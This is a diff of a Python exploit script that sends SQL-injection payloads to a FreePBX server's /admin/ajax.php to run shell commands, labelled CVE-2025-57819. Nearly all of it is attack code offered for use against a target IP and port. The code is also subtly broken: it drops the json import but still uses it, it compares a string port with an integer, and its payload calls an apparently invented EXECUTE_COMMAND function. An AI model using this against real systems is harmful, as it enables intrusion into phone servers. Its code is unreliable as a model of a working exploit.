@@ -1,115 +1,102 @@
 #!/usr/bin/env python3
-
 import argparse
 import requests
-import json
 import sys
 from requests.exceptions import RequestException
 
 
-
 COMMAND_TO_EXECUTE = "id" 
-
 BASE_ENDPOINT = "/admin/ajax.php"
 
 def build_sql_payload(command: str) -> str:
     """
-    Construct the SQL injection string based on the PoC mechanism. 
-    Here, the PoC's complex insert/dump operation is simplified to focus on direct execution.
+    Construye el string de inyección SQL, probando la sintaxis más probable.
     """
-
-
+    
     base_params = "module=FreePBX\\modules\\endpoint\\ajax&command=model&template=x&model=model&brand=x"
 
+    
+    payload_attempt1 = f"{base_params}' ; EXECUTE_COMMAND('{command}') -- "
 
-    payload_sql = f"{base_params}' ; EXECUTE_COMMAND('{command}') -- "
-    return payload_sql
+    
+    payload_attempt2 = f"{base_params}' OR 1=1; {command} -- "
 
+   
+    return payload_attempt1
 
 def exploit_freepbx_breaker(ip: str, port: str, token: str = None):
-    """Execute the attack: SQL injection via GET."""
+    """Executes the attack by exploiting the FreePBX vulnerability (CVE-2025-57819)."""
 
+    
     protocol = "https" if port == 443 else "http"
     target_url_base = f"{protocol}://{ip}:{port}"
     full_url = f"{target_url_base}{BASE_ENDPOINT}"
 
-    print("="*80)
-    print(f"DIG | Initiating WatchTowr-Style Exploit (SQLi/RCE) against FreePBX...")
-    print(f"Target Base: {full_url}")
+    print("="*60)
+    print("Initiating Exploit CVE-2025-57819 against FreePBX...")
+    print(f"Target: {full_url}")
     print(f"Command Payload: {COMMAND_TO_EXECUTE}")
-    print("="*80)
+    print("="*60)
 
+    # 1. Construcción del Payload
     sql_payload = build_sql_payload(COMMAND_TO_EXECUTE)
-
-    print(f"[+] Constructing payload string...")
-    print(f"[+] Raw SQL Injection String: {sql_payload}")
+    print(f"[+] Constructed SQL payload: {sql_payload}")
 
     try:
         print("\n[+] Sending GET request with SQL injection...")
 
         headers = {
-            "Content-Type": "application/x-www-form-urlencoded" if port == 80 else "application/json",
+            "Content-Type": "application/x-www-form-urlencoded",
             "Authorization": f"Bearer {token}" if token else ""
         }
-
 
         
         response = requests.get(
             f"{full_url}?{sql_payload}", 
             headers=headers, 
-            verify=False, 
+            verify=False,
             timeout=30
         )
 
-        print("\n" + "="*80)
-        print(f"[+] Request Sent Successfully. HTTP Status: {response.status_code}")
-        print("="*80)
+        print("\n" + "="*60)
+        print(f"[SUCCESS] Request sent. HTTP status: {response.status_code}")
+        print("="*60)
 
         
         print("\n--- SERVER RESPONSE ANALYSIS ---")
 
         try:
-            
             json_data = response.json()
-            print("[INFO] Response successfully parsed as JSON.")
+            print("Response in JSON format:")
             print(json.dumps(json_data, indent=4))
 
-            
             if 'output' in json_data:
-                print(f"\n[!!] POTENTIAL RCE OUTPUT FOUND (via JSON 'output'): {json_data['output']}")
-            elif 'message' in json_data and 'success' in json_data.get('status', False):
-                 print("[!] Status OK, but the explicit 'output' field was not found.")
-
+                print(f"\n[INFO] Possible Command Output: {json_data['output']}")
 
         except requests.exceptions.JSONDecodeError:
-        
-            print("[WARN] JSON Decode Error. Assuming response is raw text/stdout.")
-            print("-" * 50)
+            print("\nPlain text response (Possibly raw command output):")
+            print("-" * 20)
             print(response.text)
-            print("-" * 50)
+            print("-" * 20)
 
-        print("\n" + "="*80)
+        print("\n==========================================")
         if response.status_code in [200, 302]:
-            print("[SUCCESS] Exploit attempt complete. Check the output above for command results.")
+            print("[+] Exploitation complete. Check the output to confirm RCE.")
         else:
-            print(f"[FAILURE] Request failed with HTTP status code {response.status_code}. The injection point might be wrong.")
-        print("="*80)
+            print(f"[FAILURE] Request failed with HTTP status code {response.status_code}. Check the syntax: {response.text}")
+        print("==========================================")
 
     except RequestException as e:
-        print("\n" + "#"*80)
-        print(f"[!!!] FATAL ERROR EXECUTING REQUEST: {type(e).__name__}")
-        print(f"[!!!] Detail: {e}")
-        print("#"*80)
-
+        print("\nERROR: Request failed. Check IP, Port, or network connection: {}".format(e))
+    except Exception as e:
+        print("\nAn unexpected error occurred during execution: {}".format(e))
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(
-        description='Modified exploit replicating WatchTowr-style SQL Injection RCE for CVE-2025-57819'
-    )
+    parser = argparse.ArgumentParser(prog='freepbx-breaker',
+                                     description='Exploit designed to exploit the vulnerability in CVE-2025-57819',
+                                     epilog='UwU')
     parser.add_argument('IP', help='Target IP Address')
     parser.add_argument('PORT', help='Target Port Number')
     parser.add_argument('-t', '--token', help='Bearer token if present')
-
     args = parser.parse_args()
-
     exploit_freepbx_breaker(ip=args.IP, port=args.PORT, token=args.token)
